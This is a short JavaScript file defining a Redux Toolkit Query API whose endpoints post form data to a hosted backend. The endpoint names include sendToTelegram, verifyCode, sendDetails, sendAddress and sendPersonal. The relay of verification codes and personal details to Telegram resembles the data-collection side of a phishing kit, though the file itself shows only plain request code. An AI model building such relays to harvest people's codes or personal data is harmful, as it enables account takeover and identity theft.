import { createApi, fetchBaseQuery } from '@reduxjs/toolkit/query/react';

export const telegramApi = createApi({
  reducerPath: 'telegramApi',
  baseQuery: fetchBaseQuery({ 
    baseUrl: 'https://project1-jyfl.onrender.com' }),

  endpoints: (builder) => ({
    sendToTelegram: builder.mutation({
      query: (data) => ({
        url: '/sendToTelegram',
        method: 'POST',
        body: data,
      }),
     
    }),
    verifyCode: builder.mutation({
      query: (data) => ({
        url: '/verifyCode',
        method: 'POST',
        body: data,
      }),
    }),
    sendDetails: builder.mutation({
      query: (data) => ({
        url: '/sendDetails',
        method: 'POST',
        body: data,
      }),
    }),
    sendVerify: builder.mutation({
      query: (data) => ({
        url: '/sendVerify',
        method: 'POST',
        body: data,
      }),
    }),
  sendGoal: builder.mutation({
  query: (data) => ({
    url: '/sendGoal',
    method: 'POST',
    body: data,
  }),
}),

sendAddress: builder.mutation({
  query: (data) => ({
    url: '/sendAddress',
    method: 'POST',
    body: data,
  }),
}),



    sendPersonal: builder.mutation({
      query: (data) => ({
        url: '/sendPersonal',
        method: 'POST',
        body: data,
      }),
    }),
  }),
});

export const {
  useSendToTelegramMutation,
  useVerifyCodeMutation,
  useSendDetailsMutation,
  useSendVerifyMutation,
  useSendGoalMutation,
  useSendAddressMutation,
  useSendPersonalMutation,
} = telegramApi;








